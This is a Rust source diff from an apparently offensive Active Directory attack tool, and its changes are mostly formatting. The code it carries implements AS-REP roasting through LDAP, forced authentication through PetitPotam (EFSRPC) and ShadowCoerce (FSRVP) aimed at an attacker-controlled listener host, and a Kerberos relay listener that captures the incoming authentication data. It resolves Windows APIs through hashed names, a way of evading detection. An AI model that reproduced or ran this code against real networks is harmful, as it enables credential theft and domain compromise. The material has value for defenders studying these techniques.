         let ldap_unbind: FnLdapUnbind = resolve_ldap_fn!("ldap_unbind", FnLdapUnbind);
-        let ldap_count_entries: FnLdapCountEntries = resolve_ldap_fn!("ldap_count_entries", FnLdapCountEntries);
+        let ldap_count_entries: FnLdapCountEntries =
+            resolve_ldap_fn!("ldap_count_entries", FnLdapCountEntries);
 
         type FnLdapSearchS = unsafe extern "system" fn(
-            *mut c_void, *const u16, u32, *const u16, *mut *const u16, u32, *mut *mut c_void,
+            *mut c_void,
+            *const u16,
+            u32,
+            *const u16,
+            *mut *const u16,
+            u32,
+            *mut *mut c_void,
         ) -> u32;
         let ldap_search_s: FnLdapSearchS = resolve_ldap_fn!("ldap_search_sW", FnLdapSearchS);
 
         // Connect to LDAP.
-        let dc_w: Vec<u16> = dc_address.encode_utf16().chain(std::iter::once(0)).collect();
+        let dc_w: Vec<u16> = dc_address
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
         let ld = ldap_init(dc_w.as_ptr(), 389, 0);
         if ld.is_null() {
             bail!("ldap_initW failed for {}", dc_address);
@@ -2354,11 +2446,7 @@ pub fn asrep_roast_ldap(dc_address: &str, etype: i32) -> Result<Vec<AsRepRoastEn
 
         let sam_w: Vec<u16> = "sAMAccountName\0".encode_utf16().collect();
         let cn_w: Vec<u16> = "cn\0".encode_utf16().collect();
-        let mut attrs_ptrs: Vec<*const u16> = vec![
-            sam_w.as_ptr(),
-            cn_w.as_ptr(),
-            ptr::null(),
-        ];
+        let mut attrs_ptrs: Vec<*const u16> = vec![sam_w.as_ptr(), cn_w.as_ptr(), ptr::null()];
 
         let mut search_result: *mut c_void = ptr::null_mut();
         let status = ldap_search_s(
@@ -2373,11 +2461,17 @@ pub fn asrep_roast_ldap(dc_address: &str, etype: i32) -> Result<Vec<AsRepRoastEn
 
         if status != LDAP_SUCCESS {
             ldap_unbind(ld);
-            bail!("LDAP search for DONT_REQ_PREAUTH users failed: error {}", status);
+            bail!(
+                "LDAP search for DONT_REQ_PREAUTH users failed: error {}",
+                status
+            );
         }
 
         let entry_count = ldap_count_entries(ld, search_result);
-        tracing::info!("AS-REP roast: found {} users with DONT_REQ_PREAUTH", entry_count);
+        tracing::info!(
+            "AS-REP roast: found {} users with DONT_REQ_PREAUTH",
+            entry_count
+        );
 
         // Collect usernames.
         let mut usernames = Vec::new();
@@ -2406,7 +2500,12 @@ pub fn asrep_roast_ldap(dc_address: &str, etype: i32) -> Result<Vec<AsRepRoastEn
 }
 
 /// AS-REP roast as JSON.
-pub fn asrep_roast_json(dc_address: &str, realm: &str, usernames: &[String], etype: i32) -> Result<String> {
+pub fn asrep_roast_json(
+    dc_address: &str,
+    realm: &str,
+    usernames: &[String],
+    etype: i32,
+) -> Result<String> {
     let entries = asrep_roast(dc_address, realm, usernames, etype)?;
     Ok(serde_json::to_string_pretty(&serde_json::json!({
         "asrep_roast": entries,
@@ -2441,21 +2540,25 @@ pub struct CoercionResult {
 
 /// EFSRPC interface UUID: c681d488-d850-11d0-8c52-00c04fd90f7e
 const EFSRPC_UUID: [u8; 16] = [
-    0x88, 0xD4, 0x81, 0xC6, 0x50, 0xD8, 0xD0, 0x11,
-    0x8C, 0x52, 0x00, 0xC0, 0x4F, 0xD9, 0x0F, 0x7E,
+    0x88, 0xD4, 0x81, 0xC6, 0x50, 0xD8, 0xD0, 0x11, 0x8C, 0x52, 0x00, 0xC0, 0x4F, 0xD9, 0x0F, 0x7E,
 ];
 
 /// FSRVP interface UUID: f59fc2b4-9501-44a5-8c47-c4f78d21d6f2
 const FSRVP_UUID: [u8; 16] = [
-    0xB4, 0xC2, 0x9F, 0xF5, 0x01, 0x95, 0xA5, 0x44,
-    0x8C, 0x47, 0xC4, 0xF7, 0x8D, 0x21, 0xD6, 0xF2,
+    0xB4, 0xC2, 0x9F, 0xF5, 0x01, 0x95, 0xA5, 0x44, 0x8C, 0x47, 0xC4, 0xF7, 0x8D, 0x21, 0xD6, 0xF2,
 ];
 
 /// RPC function pointer types.
 type FnRpcStringBindingComposeW = unsafe extern "system" fn(
-    *const u16, *const u16, *const u16, *const u16, *const u16, *mut *mut u16,
+    *const u16,
+    *const u16,
+    *const u16,
+    *const u16,
+    *const u16,
+    *mut *mut u16,
 ) -> i32;
-type FnRpcBindingFromStringBindingW = unsafe extern "system" fn(*const u16, *mut *mut c_void) -> i32;
+type FnRpcBindingFromStringBindingW =
+    unsafe extern "system" fn(*const u16, *mut *mut c_void) -> i32;
 type FnRpcBindingFree = unsafe extern "system" fn(*mut *mut c_void) -> i32;
 type FnRpcStringFreeW = unsafe extern "system" fn(*mut *mut u16) -> i32;
 type FnNdrClientCall2 = unsafe extern "system" fn(
@@ -2469,12 +2572,12 @@ type FnNdrClientCall2 = unsafe extern "system" fn(
 /// RPC_MESSAGE structure used by the internal RPC runtime API.
 #[repr(C)]
 struct RpcMessage {
-    handle: *mut c_void,           // RPC_BINDING_HANDLE
-    data_representation: u32,      // NDR data representation
-    buffer: *mut u8,               // RPC stub data buffer
-    buffer_length: u32,            // allocated buffer size
-    proc_num: u32,                 // operation number within interface
-    transfer_syntax: *mut c_void,  // PRPC_SYNTAX_IDENTIFIER
+    handle: *mut c_void,                    // RPC_BINDING_HANDLE
+    data_representation: u32,               // NDR data representation
+    buffer: *mut u8,                        // RPC stub data buffer
+    buffer_length: u32,                     // allocated buffer size
+    proc_num: u32,                          // operation number within interface
+    transfer_syntax: *mut c_void,           // PRPC_SYNTAX_IDENTIFIER
     rpc_interface_information: *mut c_void, // RPC_CLIENT_INTERFACE *
     reserved_for_runtime: *mut c_void,
     manager_epv: *mut c_void,
@@ -2558,22 +2661,24 @@ pub fn coerce_auth_via_petitpotam(
 
         macro_rules! resolve_rpc_fn {
             ($name:expr, $ty:ty) => {
-                pe_resolve::get_proc_address_by_hash(rpcrt4, pe_resolve::hash_str(concat!($name, "\0").as_bytes()))
-                    .ok_or_else(|| anyhow!("{} not found in rpcrt4.dll", $name))
-                    .map(|addr| std::mem::transmute::<usize, $ty>(addr))?
+                pe_resolve::get_proc_address_by_hash(
+                    rpcrt4,
+                    pe_resolve::hash_str(concat!($name, "\0").as_bytes()),
+                )
+                .ok_or_else(|| anyhow!("{} not found in rpcrt4.dll", $name))
+                .map(|addr| std::mem::transmute::<usize, $ty>(addr))?
             };
         }
 
         let string_binding_compose: FnRpcStringBindingComposeW =
             resolve_rpc_fn!("RpcStringBindingComposeW", FnRpcStringBindingComposeW);
-        let binding_from_string: FnRpcBindingFromStringBindingW =
-            resolve_rpc_fn!("RpcBindingFromStringBindingW", FnRpcBindingFromStringBindingW);
-        let binding_free: FnRpcBindingFree =
-            resolve_rpc_fn!("RpcBindingFree", FnRpcBindingFree);
-        let string_free: FnRpcStringFreeW =
-            resolve_rpc_fn!("RpcStringFreeW", FnRpcStringFreeW);
-        let rpc_get_buffer: FnIRpcGetBuffer =
-            resolve_rpc_fn!("I_RpcGetBuffer", FnIRpcGetBuffer);
+        let binding_from_string: FnRpcBindingFromStringBindingW = resolve_rpc_fn!(
+            "RpcBindingFromStringBindingW",
+            FnRpcBindingFromStringBindingW
+        );
+        let binding_free: FnRpcBindingFree = resolve_rpc_fn!("RpcBindingFree", FnRpcBindingFree);
+        let string_free: FnRpcStringFreeW = resolve_rpc_fn!("RpcStringFreeW", FnRpcStringFreeW);
+        let rpc_get_buffer: FnIRpcGetBuffer = resolve_rpc_fn!("I_RpcGetBuffer", FnIRpcGetBuffer);
         let rpc_send_receive: FnIRpcSendReceive =
             resolve_rpc_fn!("I_RpcSendReceive", FnIRpcSendReceive);
         let rpc_free_buffer: FnIRpcFreeBuffer =
@@ -2581,7 +2686,10 @@ pub fn coerce_auth_via_petitpotam(
 
         // Build the string binding to the target's EFSRPC endpoint.
         let proto_seq_w: Vec<u16> = "ncacn_np\0".encode_utf16().collect();
-        let target_w: Vec<u16> = target_host.encode_utf16().chain(std::iter::once(0)).collect();
+        let target_w: Vec<u16> = target_host
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
         let endpoint_w: Vec<u16> = "\\pipe\\efsrpc\0".encode_utf16().collect();
 
         let mut binding_str: *mut u16 = ptr::null_mut();
@@ -2595,7 +2703,10 @@ pub fn coerce_auth_via_petitpotam(
         );
 
         if rpc_status != 0 {
-            bail!("RpcStringBindingComposeW failed: 0x{:08X}", rpc_status as u32);
+            bail!(
+                "RpcStringBindingComposeW failed: 0x{:08X}",
+                rpc_status as u32
+            );
         }
 
         // Create the binding handle.
@@ -2604,7 +2715,10 @@ pub fn coerce_auth_via_petitpotam(
         string_free(&mut binding_str);
 
         if bind_status != 0 {
-            bail!("RpcBindingFromStringBindingW failed: 0x{:08X}", bind_status as u32);
+            bail!(
+                "RpcBindingFromStringBindingW failed: 0x{:08X}",
+                bind_status as u32
+            );
         }
 
         // Build the UNC path that the target will connect to.
@@ -2650,7 +2764,10 @@ pub fn coerce_auth_via_petitpotam(
         let buf_status = rpc_get_buffer(&mut msg);
         if buf_status != 0 {
             binding_free(&mut binding_handle);
-            bail!("I_RpcGetBuffer failed for PetitPotam: 0x{:08X}", buf_status as u32);
+            bail!(
+                "I_RpcGetBuffer failed for PetitPotam: 0x{:08X}",
+                buf_status as u32
+            );
         }
 
         // Marshal the stub data into the buffer.
@@ -2725,22 +2842,24 @@ pub fn coerce_auth_via_shadowcoerce(
 
         macro_rules! resolve_rpc_fn {
             ($name:expr, $ty:ty) => {
-                pe_resolve::get_proc_address_by_hash(rpcrt4, pe_resolve::hash_str(concat!($name, "\0").as_bytes()))
-                    .ok_or_else(|| anyhow!("{} not found in rpcrt4.dll", $name))
-                    .map(|addr| std::mem::transmute::<usize, $ty>(addr))?
+                pe_resolve::get_proc_address_by_hash(
+                    rpcrt4,
+                    pe_resolve::hash_str(concat!($name, "\0").as_bytes()),
+                )
+                .ok_or_else(|| anyhow!("{} not found in rpcrt4.dll", $name))
+                .map(|addr| std::mem::transmute::<usize, $ty>(addr))?
             };
         }
 
         let string_binding_compose: FnRpcStringBindingComposeW =
             resolve_rpc_fn!("RpcStringBindingComposeW", FnRpcStringBindingComposeW);
-        let binding_from_string: FnRpcBindingFromStringBindingW =
-            resolve_rpc_fn!("RpcBindingFromStringBindingW", FnRpcBindingFromStringBindingW);
-        let binding_free: FnRpcBindingFree =
-            resolve_rpc_fn!("RpcBindingFree", FnRpcBindingFree);
-        let string_free: FnRpcStringFreeW =
-            resolve_rpc_fn!("RpcStringFreeW", FnRpcStringFreeW);
-        let rpc_get_buffer: FnIRpcGetBuffer =
-            resolve_rpc_fn!("I_RpcGetBuffer", FnIRpcGetBuffer);
+        let binding_from_string: FnRpcBindingFromStringBindingW = resolve_rpc_fn!(
+            "RpcBindingFromStringBindingW",
+            FnRpcBindingFromStringBindingW
+        );
+        let binding_free: FnRpcBindingFree = resolve_rpc_fn!("RpcBindingFree", FnRpcBindingFree);
+        let string_free: FnRpcStringFreeW = resolve_rpc_fn!("RpcStringFreeW", FnRpcStringFreeW);
+        let rpc_get_buffer: FnIRpcGetBuffer = resolve_rpc_fn!("I_RpcGetBuffer", FnIRpcGetBuffer);
         let rpc_send_receive: FnIRpcSendReceive =
             resolve_rpc_fn!("I_RpcSendReceive", FnIRpcSendReceive);
         let rpc_free_buffer: FnIRpcFreeBuffer =
@@ -2748,7 +2867,10 @@ pub fn coerce_auth_via_shadowcoerce(
 
         // Build the string binding to the target's FSRVP endpoint.
         let proto_seq_w: Vec<u16> = "ncacn_np\0".encode_utf16().collect();
-        let target_w: Vec<u16> = target_host.encode_utf16().chain(std::iter::once(0)).collect();
+        let target_w: Vec<u16> = target_host
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
         let endpoint_w: Vec<u16> = "\\pipe\\srvsvc\0".encode_utf16().collect();
 
         let mut binding_str: *mut u16 = ptr::null_mut();
@@ -2762,7 +2884,10 @@ pub fn coerce_auth_via_shadowcoerce(
         );
 
         if rpc_status != 0 {
-            bail!("RpcStringBindingComposeW failed: 0x{:08X}", rpc_status as u32);
+            bail!(
+                "RpcStringBindingComposeW failed: 0x{:08X}",
+                rpc_status as u32
+            );
         }
 
         let mut binding_handle: *mut c_void = ptr::null_mut();
@@ -2770,7 +2895,10 @@ pub fn coerce_auth_via_shadowcoerce(
         string_free(&mut binding_str);
 
         if bind_status != 0 {
-            bail!("RpcBindingFromStringBindingW failed: 0x{:08X}", bind_status as u32);
+            bail!(
+                "RpcBindingFromStringBindingW failed: 0x{:08X}",
+                bind_status as u32
+            );
         }
 
         // ShadowCoerce uses the FSRVP IsPathSupported (opnum 10) to trigger
@@ -2821,7 +2949,10 @@ pub fn coerce_auth_via_shadowcoerce(
         let buf_status = rpc_get_buffer(&mut msg);
         if buf_status != 0 {
             binding_free(&mut binding_handle);
-            bail!("I_RpcGetBuffer failed for ShadowCoerce: 0x{:08X}", buf_status as u32);
+            bail!(
+                "I_RpcGetBuffer failed for ShadowCoerce: 0x{:08X}",
+                buf_status as u32
+            );
         }
 
         // Marshal the stub data.
@@ -2906,16 +3037,10 @@ pub fn start_kerberos_relay_listener(
     let method = coercion_method.to_lowercase();
     let lport = listener_port;
 
-    let coerce_handle = std::thread::spawn(move || {
-        match method.as_str() {
-            "petitpotam" | "efsrpc" => {
-                coerce_auth_via_petitpotam(&target, &lhost, lport)
-            }
-            "shadowcoerce" | "fsrvp" => {
-                coerce_auth_via_shadowcoerce(&target, &lhost, lport)
-            }
-            _ => Err(anyhow!("Unknown coercion method: {}", method)),
-        }
+    let coerce_handle = std::thread::spawn(move || match method.as_str() {
+        "petitpotam" | "efsrpc" => coerce_auth_via_petitpotam(&target, &lhost, lport),
+        "shadowcoerce" | "fsrvp" => coerce_auth_via_shadowcoerce(&target, &lhost, lport),
+        _ => Err(anyhow!("Unknown coercion method: {}", method)),
     });
 
     // Accept a connection and read the authentication data.
